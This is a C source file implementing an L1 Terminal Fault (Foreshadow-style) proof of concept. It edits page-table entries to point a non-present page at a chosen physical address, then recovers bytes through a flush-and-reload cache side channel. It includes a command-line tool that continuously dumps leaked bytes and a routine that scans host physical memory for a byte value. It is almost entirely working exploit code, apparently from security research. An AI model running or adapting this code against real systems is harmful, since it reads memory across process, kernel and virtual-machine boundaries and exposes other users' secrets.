#define _GNU_SOURCE
#include "l1tf.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "statistics.h"
#include <bits/types/siginfo_t.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <ucontext.h>
#include <unistd.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>

#define THRESHOLD 150

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
static void segfault_handler_nibbles(int sig, siginfo_t *info, void *ucontext) {
  ucontext_t *uc = (ucontext_t *)ucontext;
  greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
  // *rip = (uint64_t)&reload_label_nibbles;
}

static void segfault_handler_full(int sig, siginfo_t *info, void *ucontext) {
  ucontext_t *uc = (ucontext_t *)ucontext;
  greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
  *rip = (uint64_t)&reload_label_full;
}
#pragma GCC diagnostic pop

uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
  uint8_t result = 0;
  for (size_t nibble = 0; nibble < AMOUNT_OF_NIBBLES_PER_RELOAD; ++nibble) {
    size_t *partial_results =
        &raw_results[nibble * AMOUNT_OF_OPTIONS_IN_NIBBLE];
    size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE, partial_results);
    result |= max << (4 * nibble);
  }
  return result;
}

uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
  size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};

  flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);

  // Flush the address of the segfault handler to increase
  // the length of the speculative window (hopefully?)
  clflush((void *)segfault_handler_nibbles);
  mfence();

  ret2spec(leak_addr, reload_buffer[0], reload_buffer[1]);
  // asm_l1tf_leak_nibbles(leak_addr, reload_buffer);

  reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
         THRESHOLD);

  return reconstruct_nibbles(raw_results);
}

// Super fast checking of the existance of a byte at a certain address.
// Only requires a single FLUSH+RELOAD of a single address (instead
// of 32 or 256). Useful to quickly scan physical memory, assuming we know
// that a certain byte appears.
bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
                uint8_t check) {
  clflush(reload_buffer[check]);
  clflush((void *)segfault_handler_full);
  mfence();

  asm_l1tf_leak_full(leak_addr, reload_buffer);

  size_t time = access_time(reload_buffer[check]);
  return time < THRESHOLD;
}

// Returns a pointer to the physical address where the needle was found.
void *l1tf_scan_physical_memory(size_t length, char needle[length],
                                size_t stride) {
  assert(length > 0);

  leak_addr_t leak = l1tf_leak_buffer_create();

  struct sigaction sa = {0};
  sa.sa_handler = (void *)segfault_handler_full;
  sigaction(SIGSEGV, &sa, NULL);

  // First, scan quickly
  full_reload_buffer_t reload_buffer;
  for (uintptr_t ptr = 0; ptr < HOST_MEMORY_SIZE; ptr += stride) {
    printf("%ld\r", ptr / stride);
    l1tf_leak_buffer_modify(&leak, (void *)ptr);
    if (l1tf_check(leak.leak, reload_buffer, needle[0])) {
      printf("%lx\n", ptr);
    }
  }

  // Restore the segfault handler back to normal
  sa.sa_handler = SIG_DFL;
  sigaction(SIGSEGV, &sa, NULL);

  l1tf_leak_buffer_free(&leak);
  return 0;
}

leak_addr_t l1tf_leak_buffer_create() {
  void *leak_ptr = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(leak_ptr != MAP_FAILED);
  assert(!mprotect(leak_ptr, PAGE_SIZE, PROT_NONE));

  leak_addr_t leak;
  leak.leak = leak_ptr;
  leak.original_pfn = ptedit_pte_get_pfn(leak.leak, 0);
  leak.current_pfn = leak.original_pfn;

  ptedit_pte_clear_bit(leak.leak, 0, PTEDIT_PAGE_BIT_PRESENT);
  return leak;
}

void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr) {
  size_t pfn = (((uintptr_t)ptr) & ~(0xfff)) >> 0xc;

  // This leak addr is already point to the corrent page frame
  // number, so there is no need to modify the page table.
  if (leak->current_pfn == pfn) {
    return;
  }
  leak->current_pfn = pfn;
  ptedit_pte_set_pfn(leak->leak, 0, pfn);
}

void l1tf_leak_buffer_free(leak_addr_t *leak) {
  // Restore leak PFN before munmapping the buffer
  ptedit_pte_set_pfn(leak->leak, 0, leak->original_pfn);
  assert(!munmap(leak->leak, PAGE_SIZE));
}

int main(int argc, char *argv[argc]) {
  assert(!ptedit_init());
  // l1tf_scan_physical_memory(1, "\xde", PAGE_SIZE);

  // Step 1: Create a variable
  // Step 2: modify PTE to change make page containing that variable non-present
  //         and modify the PFN
  // Step 3: FLUSH reload buffer
  // Step 4: Speculatively access variable
  // Step 5: RELOAD reload buffer
  assert(argc > 0);
  if (argc != 3) {
    fprintf(stderr, "Usage: %s [physical address to leak in hex] [length]\n",
            argv[0]);
    exit(1);
  }

  char *tail = NULL;
  uintptr_t phys_addr = strtoull(argv[1], &tail, 16);
  assert(tail != argv[1]);

  tail = NULL;
  size_t length = strtoull(argv[2], &tail, 10);
  assert(tail != argv[2]);

  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length,
          (void *)phys_addr);

  fprintf(stderr, "Request leak and reload buffers\n");

  reload_buffer_t *reload_buffer =
      mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);

  leak_addr_t leak = l1tf_leak_buffer_create();
  l1tf_leak_buffer_modify(&leak, (void *)phys_addr);

  struct sigaction sa = {0};
  sa.sa_handler = (void *)segfault_handler_nibbles;
  sigaction(SIGSEGV, &sa, NULL);

  fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
  memset(reload_buffer, 0, sizeof(reload_buffer_t));

  const size_t results_size = length * sizeof(uint8_t);
  uint8_t *results = malloc(results_size);
  memset(results, 0, results_size);

  printf("Results physcial addr %lx:\n", phys_addr);
  size_t start = (phys_addr & 0xfff);
  assert(start + length < 0xfff);

  while (1) {
    for (size_t j = start; j < start + length; j += 1) {
      void *leak_addr = (char *)leak.leak + j;
      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);

      if (leaked_byte != 0) {
        results[j - start] = leaked_byte;
      }
    }

    for (size_t i = 0; i < length; ++i) {
      printf("%02x ", results[i]);
    }
    printf("\r");
  }

  // Restore the segfault handler back to normal
  sa.sa_handler = SIG_DFL;
  sigaction(SIGSEGV, &sa, NULL);

  free(results);

  l1tf_leak_buffer_free(&leak);

  assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
  ptedit_cleanup();
}
